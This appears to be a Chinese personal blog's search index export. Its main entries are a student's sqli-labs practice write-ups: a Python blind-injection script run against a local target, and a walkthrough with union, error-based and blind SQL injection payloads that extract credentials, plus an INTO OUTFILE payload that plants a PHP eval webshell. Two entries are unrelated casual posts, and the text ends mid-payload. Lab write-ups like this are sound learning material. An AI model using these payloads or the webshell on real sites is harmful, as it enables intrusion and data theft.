<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>用python编写一个sql注入脚本</title>
    <link href="/2021/06/16/py-script-sql-injection/"/>
    <url>/2021/06/16/py-script-sql-injection/</url>
    
    <content type="html"><![CDATA[<p>现在我已经会print（“hello world”）了，下面让我们来试下一下用python写一个sql注入的脚本吧！</p><span id="more"></span><p>不久前做到sqli-labs第八关盲注时，实在是受不了纯手注了。所以暂时搁置一段，先来学学怎么写个sql注入的自动化脚本。</p><p>虽然已经有sqlmap这种成熟的工具，但毕竟是别人的，功能再全面在某些地方也有局限。我认为与其去学怎么用别人工具还不如自己掌握技术，练练编写脚本的本事。</p><p><em>首先感谢这位老哥的博客，给了我很多帮助[<a href="https://uuzdaisuki.com/"> <strong>Leticia’s Blog</strong> </a>]</em></p><p><em>希望俺的博客以后也能帮到别人😊</em></p><hr><h3 id="能力要求："><a href="#能力要求：" class="headerlink" title="能力要求："></a>能力要求：</h3><ul><li><p>会 <code>print（“hello world”）</code>不会有人幼儿园没学过这个吧，不会吧不会吧</p><p>（开个玩笑，不过现在是真能卷，网上看到个小学生教数据库的，我大二才学数据库….）</p></li><li><p>能连上存在sql注入的靶场，我这里即sqli-labs</p><p>（我是在虚拟机环境搭建的靶场，主机运行的python环境。幸好vm虚拟机网络这方面整的好，把搭建靶场的虚拟机防火墙关了就能连上。过段时间再补补网络的知识。）</p></li></ul><h3 id="接下来要学到的："><a href="#接下来要学到的：" class="headerlink" title="接下来要学到的："></a>接下来要学到的：</h3><ul><li><strong>在盲注中使用的一系列命令</strong></li><li><strong>python 中request库的使用，其实也就是要会写个简单的爬虫</strong></li></ul><hr><h4 id="sql盲注命令部分："><a href="#sql盲注命令部分：" class="headerlink" title="sql盲注命令部分："></a>sql盲注命令部分：</h4><p><em>以下关于命令的部分内容截取自</em></p><p><em><a href="https://www.w3school.com.cn/sql/sql_functions.asp">SQL 函数 (w3school.com.cn)</a></em></p><p><em><a href="https://my.oschina.net/zz006/blog/810112">sql中substr与substring函数用法 - 周大壮 - OSCHINA - 中文开源技术交流社区</a></em></p><ul><li><p>用来截取字符串的函数：</p><ul><li><strong><code>mid()</code></strong>    </li></ul><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> MID(<span class="hljs-built_in">column_name</span>,<span class="hljs-keyword">start</span>[,length]) <span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br></code></pre></div></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">column_name</td><td align="left">必需。要提取字符的字段。</td></tr><tr><td align="center">start</td><td align="left">必需。规定开始位置（起始值是 1）。</td></tr><tr><td align="center">length</td><td align="left">可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td></tr></tbody></table><p>如：</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><span class="hljs-comment">//返回数据库第一位</span><br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br><span class="hljs-comment">//返回数据库名的第一位并与a的ascii作比较。</span><br></code></pre></div></td></tr></table></figure><ul><li><strong><code>substr()</code>和<code>substring()</code></strong></li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">substr(<span class="hljs-keyword">string</span>,<span class="hljs-built_in">start</span>,<span class="hljs-built_in">length</span>)<br>substr(<span class="hljs-keyword">string</span>, <span class="hljs-built_in">start</span>, <span class="hljs-built_in">length</span>)<br></code></pre></div></td></tr></table></figure><p>string - 指定的要截取的字符串。<br>start - 必需，规定在字符串的何处开始。<br>正数 - 在字符串的指定位置开始<br>负数 - 在从字符串结尾的指定位置开始<br>0 - 在字符串中的第一个字符处开始<br>length - 指定要截取的字符串长度</p><p>可以看出用法同mid()类似</p><p>如：</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br>//返回数据库的第二位，然后与a的ascii值比较<br>substr((<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-type">text</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br>//查找test数据库的第一个表名并提取表名的第一位,然后与a的ascii值作比较。<br></code></pre></div></td></tr></table></figure><ul><li><p><code>left()</code></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(string,n)</span></span><br></code></pre></div></td></tr></table></figure><p>string ： 必要参数，要截取的字符串。</p><p>n : 必要参数，规定截取的长度，从1开始。</p><p>如：</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br><span class="hljs-comment">//查看数据库名的第一位并和a的ascii作比较</span><br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>用来针对基于时间的盲注的函数：</p><ul><li><p><code>sleep()</code></p><figure class="highlight isbl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">sleep</span></span>(<span class="hljs-variable">seconds</span>)</span><br></code></pre></div></td></tr></table></figure><p>seconds ： 必要参数，延迟的秒数。</p><figure class="highlight lisp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lisp">if(<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;&#x27;a&#x27;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))#<br></code></pre></div></td></tr></table></figure><p>检测数据库的第一个字符的ascii值，再与a的ascii比较，如果浏览器直接显示，说明比a大，如果浏览器五秒后才显示，说明比a小</p></li></ul></li></ul><h4 id="python脚本部分："><a href="#python脚本部分：" class="headerlink" title="python脚本部分："></a>python脚本部分：</h4><ul><li><p>安装request库</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">pip install request<br><span class="hljs-regexp">//</span>win <span class="hljs-number">10</span>下 ctrl+r 输入cmd 运行<br></code></pre></div></td></tr></table></figure></li><li><p>代码实现</p><figure class="highlight moonscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs moonscript">#! -*- <span class="hljs-name">encoding</span>:utf<span class="hljs-number">-8</span> -*-<br># python3<br><span class="hljs-keyword">import</span> requests<br>#用这里的语句分别替换id中的内容即可爆库、表、字段<br>#<span class="hljs-built_in">select</span> group_concat(SCHEMA_NAME) <span class="hljs-keyword">from</span> information_schema.SCHEMATA<br>#<span class="hljs-built_in">select</span> group_concat(TABLE_NAME) <span class="hljs-keyword">from</span> information_schema.TABLES where TABLE_SCHEMA = <span class="hljs-string">&#x27;xxx&#x27;</span><br>#<span class="hljs-built_in">select</span> group_concat(COLUMN_NAME) <span class="hljs-keyword">from</span> information_schema.COLUMNS where TABLE_SCHEMA = <span class="hljs-string">&#x27;xxx&#x27;</span> <span class="hljs-keyword">and</span> TABLE_NAME = <span class="hljs-string">&#x27;xxx&#x27;</span><br>dic=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz,_&#x27;</span><br>url=<span class="hljs-string">&#x27;http://127.0.0.1/sqli-labs/Less-8/?id=1\&#x27; and &#x27;</span><br><span class="hljs-built_in">string</span>=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-name">dic</span>:<br>        id=<span class="hljs-string">&quot;substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),&#123;0&#125;,1)=&#123;1&#125;--+&quot;</span>.format(str(i),ascii(j))<br>        #<span class="hljs-built_in">print</span>(id)<br>        url_get=(url+id)<br>        #<span class="hljs-built_in">print</span>(url_get)<br>        r=requests.get(url_get)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You&quot;</span> <span class="hljs-keyword">in</span> r.<span class="hljs-name">text</span>:<br>            <span class="hljs-built_in">string</span>+=j<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">string</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">string</span>)<br></code></pre></div></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>渗透</tag>
      
      <tag>py脚本</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>俺的博客满月了！</title>
    <link href="/2021/06/13/for-a-month/"/>
    <url>/2021/06/13/for-a-month/</url>
    
    <content type="html"><![CDATA[<p>我好厉害呀！</p><span id="more"></span><hr><p>当初为什么要搭建这个博客呢        </p><p>（这个博客也不能算我搭的…用的框架，甚至还没自己的服务器…）</p><p>是想着写下我的学习记录，督促自己去学习，甚至还能帮到别人    </p><p>（目前为止写的全是吹水水，别人的博客叫技术博客，我的博客叫QQ空间…）</p><p>目前为止嘛，我做的还行吧    </p><p>（四舍五入就是——我好厉害呀！）</p><hr><p>反正都是写给自己看的玩意，俺就是想夸夸俺自己。</p><p>我是菜狗汪汪汪，我爱学习呜呜呜。</p><hr><p>不过为啥文章这么少呢…</p><p>最近其实学了好多东西，不过还有更多的地方没整明白，不好写技术文…</p><p>也经历了好多事，但忙着学技术也没心思写小作文发牢骚了…</p><hr><p>总结完了，投身祖国的建设比在这逼逼赖赖更重要！</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
    <tags>
      
      <tag>大日子！</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>原来分开的日子，你数的这么清楚</title>
    <link href="/2021/06/04/cloud-music/"/>
    <url>/2021/06/04/cloud-music/</url>
    
    <content type="html"><![CDATA[<p>总在失去之后才学会怀念。</p><span id="more"></span><hr><p>从没想到分开后你会变得这么卑微，能一天天细数着以前的日子。</p><p>那的确是段快乐的时光，我只记得天地辽阔。</p><p>可你像是急着结束。不多一天，没有拖延。</p><p>可你又像是耐心陪伴。不少一天，不斩丝连。</p><p>没想到有天再见时，你打折了。</p><p>都不重要了，我早就找到了替代你的。</p><p>不瞒你说我甚至还找了俩，分别是小Q和小咪。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/deaa625e58edafa80b88abb0a1bb2f2e.jpg"></p><p>说的就是你，网易云</p><p>几块钱的事怎么这么能惦记啊，都快300天了</p><p>（今天打开网易云时的弹窗，有感而发，请对号入座）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210604180917.png"></p><p><strong>主要你这个会员有啥用，会员到期了就听不了会员时下载的歌合理吗</strong></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/v2-a069e19b50660410b414101dc9a48d40_720w.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入入门——sqli-labs闯关历程（持续更新中...</title>
    <link href="/2021/05/19/sql-injection/"/>
    <url>/2021/05/19/sql-injection/</url>
    
    <content type="html"><![CDATA[<p>sqli_labs，一个印度老哥搭建的sql注入靶场。</p><p>由于确实没啥基础，做这个题还是靠网上教程，争取总结到位，有自己的思考。解题过程中用到了火狐插件hackbar作为辅助工具。</p><span id="more"></span><hr><h3 id="sql注入常规流程"><a href="#sql注入常规流程" class="headerlink" title="sql注入常规流程"></a>sql注入常规流程</h3><p><em>先附上我在b站看到的一位up主总结的sql注入大体流程</em></p><ul><li><strong>判断是否有注入</strong><ul><li>可控参数的改变是否能够影响页面显示结果</li><li>输入的sql语句是否能报错——通过数据库的报错，能看到数据库的一些语句痕迹</li><li>输入的sql语句能否不报错——判断我们的语句是否能成功闭合</li></ul></li><li>判断是什么类型的注入</li><li><strong>语句是否能够被恶意修改</strong></li><li><strong>是否能够成功执行</strong></li><li>获取我们想要的数据</li></ul><hr><h3 id="通关历程"><a href="#通关历程" class="headerlink" title="通关历程"></a>通关历程</h3><hr><h3 id="1-4"><a href="#1-4" class="headerlink" title="1~4"></a>1~4</h3><ul><li><p>输入单双引号，观察报错信息，构造命令使语句闭合</p></li><li><p>使用 order by 语句判断字段数，接着union select 1,2,…观察能显示的数据</p></li><li><p>构造语句查询数据库的信息,以查询 security数据库下users表中列名为password和username的字段为例</p><p>（当然，security,users,password和username是一步步爆出来的）：</p><figure class="highlight oxygene"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs oxygene">... <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata %<span class="hljs-number">23</span><br><br><span class="hljs-comment">//查询所有的数据库名,查到有“security”</span><br></code></pre></div></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> %<span class="hljs-number">23</span><br><br>//查询名为“<span class="hljs-keyword">security</span>”的数据库下所有的表名，查到有“users”<br></code></pre></div></td></tr></table></figure><figure class="highlight oxygene"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs oxygene">... <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> %<span class="hljs-number">23</span><br><br><span class="hljs-comment">//查询名为“users”的表下所有的列名</span><br><span class="hljs-comment">//若不同库下有同名表下同名列，则查询时where语句后加上 and table_schema=“security”</span><br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">... union <span class="hljs-keyword">select</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, group_concat(concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>,username)) <span class="hljs-keyword">from</span> security.users %<span class="hljs-number">23</span><br><br>//查询数据库security中uers表的列<span class="hljs-keyword">password</span>和username的所有字段并用‘~’隔开<br></code></pre></div></td></tr></table></figure></li></ul><hr><h3 id="5-6"><a href="#5-6" class="headerlink" title="5~6"></a>5~6</h3><p>输入的正常查询语句不再显示有用的信息，但报错语句仍有提示。此时根据题目类型“double injection”采用双查询注入的方法</p><blockquote><p><em>若SQL语句正确，则页面正常返回，但返回的页面中不包含任何有用的信息，而当SQL语句错误时，页面会显示SQL错误信息。在这种情况下，Double Injection是十分有用的。</em>    <img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210529133753.png"></p><p>​                <em>———查询有关double injection的详细信息请点击这里<a href="https://blog.werner.wiki/principle-of-double-injection-in-mysql/">Mysql中Double Injection原理浅析</a></em></p></blockquote><p>第一步完全一致，第二步不再用<code>select 1,2...</code>来观察回显，最多可用<code>order by</code>得到<code>union select</code> 的字段数。第三步中语句<code>union select...</code>后面拼接<code>concat((select...)</code>语句，两个select组成双查询。</p><ul><li><p>输入单双引号，观察报错信息，构造命令使语句闭合</p></li><li><p>使用 order by 语句判断字段数</p></li><li><p>构造语句查询数据库的信息<strong>（注意：group_concat函数在这里失效了，故没使用）</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br><br>//查询当前数据库,得知当前数据库为‘security’，如要查别的数据库就<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>（group_concat没了才知道它的好用...）<br><br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br>//<span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> --&gt;limt <span class="hljs-number">1</span>,<span class="hljs-number">1</span> ...慢慢增加<span class="hljs-number">1</span>，直到<span class="hljs-keyword">limit</span> <span class="hljs-number">2</span>,<span class="hljs-number">1</span>查到我们需要的表名“users”（为啥需要这个呢...做题嘛）<br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br>//同样<span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> --&gt;limt <span class="hljs-number">1</span>,<span class="hljs-number">1</span> ...慢慢增加<span class="hljs-number">1</span>知道查到列名username和<span class="hljs-keyword">password</span><br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br>//查询security.users下第一行的username和<span class="hljs-keyword">password</span>并用“~”隔开<br></code></pre></div></td></tr></table></figure></li></ul><hr><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p>​        这里使mysql语句闭合的方式为<code>?id=1&#39;))...%23</code>比之前略微复杂,而且还没有具体的语法报错内容，只能多次尝试（这也太不友好了…<a href="https://blog.csdn.net/gou1791241251/article/details/111568910">点击查看这位老哥构造闭合语句的过程</a>）。同样页面不在显示有用的内容，只能看出语句是否正确，同5~6情况相似，最多可用<code>order by</code>得到<code>union select</code> 的字段数。但这关双注入的方式失效了，根据提示采用上传文件的方式。</p><p><strong>ps：途中我遇到了怎么也上传不了文件的情况， <a href="https://cloud.tencent.com/developer/article/1671259">这里</a>解释了原因，即需要先修改配置，赋予权限</strong>。可以看出这个漏洞的实现有较严格的条件限制。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618162821.png"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">...union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> into outfile<span class="hljs-string">&quot;C://hello.txt&quot;</span><br><span class="hljs-regexp">//</span>注意路径用“<span class="hljs-regexp">//</span>”,该语句执行结果如下，新生成了一个写有内容的hello文件。（好厉害直接就在C盘里塞东西）<br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210606235322.png"></p><p>将<code>hello.txt</code>改成一句话木马的php文件,因为这里的服务器是用PHP study搭建的，所以需要把该文件上传至<code>PHPTutorial\WWW</code>目录下（不同版本的phpstudy路径可能不同，而至于实际渗透环境中，这个目录就需要靠方法找了，这里暂时提供一个<a href="https://blog.csdn.net/YQavenger/article/details/108967912">别人的方法-来自csdn</a>），再使用菜刀或蚁剑链接就可以了。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">...?id=-<span class="hljs-number">1</span><span class="hljs-string">&#x27;))union select &quot;hello world!&quot;,&#x27;</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;,&quot;hacked!&quot; into outfile &quot;E:\\PHPTutorial\\WWW\\a.php&quot; %23</span><br><span class="hljs-string">//select 的值会写进文件中，若想写入字符串字符串需要用单引号或双引号闭合</span><br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618230901.png"></p><p><em>尝试链接时，最开始我用的菜刀，过了一天就报毒，然后被系统自己删了；然后换了蚁剑，结果连不上，之前连dvwa时也是链接不上，但我都能直接访问….用蚁剑就连起了几个在线靶场的环境。我认为应该就是蚁剑出了问题，可这俩玩意我都是从github上官方下的…这阵子比较忙以后再弄工具</em></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618231315.png"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/20210618231725.png"></p><p>（正常的话应该会显示绿色的对话框提示链接成功的）</p><p>因为是直接上传了木马，链接成功的话就能直接控制服务器了。sql注入这个文件上传的漏洞威胁显然是很大的，我感觉以后遇到的情况会很少。</p><hr><h3 id="8-10"><a href="#8-10" class="headerlink" title="8~10"></a>8~10</h3><p>这里开始接触盲注，（盲注：后台使用了一些方法屏蔽了把偶从信息，此时无法通过报错信息进行注入的判断）同时这也是最常见的sql注入。</p><p>盲注又大概分为布尔型和时间型。</p><p><strong>另外因为盲注会比较繁琐，所以有必要学会使用，编写脚本。</strong></p><p>接下来我会从手注并配合python脚本的方式来完成。</p><p>手注：</p><p>​    同样可以先进行这两步：</p><ul><li><p>输入单双引号，观察显示信息，构造命令使语句闭合</p></li><li><p>使用 order by 语句判断字段数</p><p>因为显示的信息只有两种情况，语句正确时显示一句话”You are in…“,语句错误时没有显示。我们就只能利用这个信息，靠猜的方式去完成注入。这就是使用基于bool类型的注入。</p><p>就像这样：</p><figure class="highlight isbl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs isbl">输入<span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(database()) = 5 --+，显示异常</span><br><span class="hljs-string">输入1&#x27;</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">length</span></span>(<span class="hljs-title">database</span>()) = <span class="hljs-number">6</span> --+，显示异常</span><br><span class="hljs-function">输入<span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(database()) = 7 --+，显示异常</span></span><br><span class="hljs-string"><span class="hljs-function">输入1&#x27;</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-title"><span class="hljs-built_in">length</span></span>(<span class="hljs-title">database</span>()) = <span class="hljs-number">8</span> --+，显示正常</span><br><span class="hljs-function"><span class="hljs-comment">//说明数据库名长度为8个字符。</span></span><br></code></pre></div></td></tr></table></figure><p>即像这种一步步爆破的方式。这还只是得到了一个模糊的信息，注入的工作还远远没完成。所以学会利用工具是很有必要的。</p><figure class="highlight cos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cos">输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span> %<span class="hljs-number">23</span>，显示存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值大于<span class="hljs-number">97</span>（小写字母a的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span 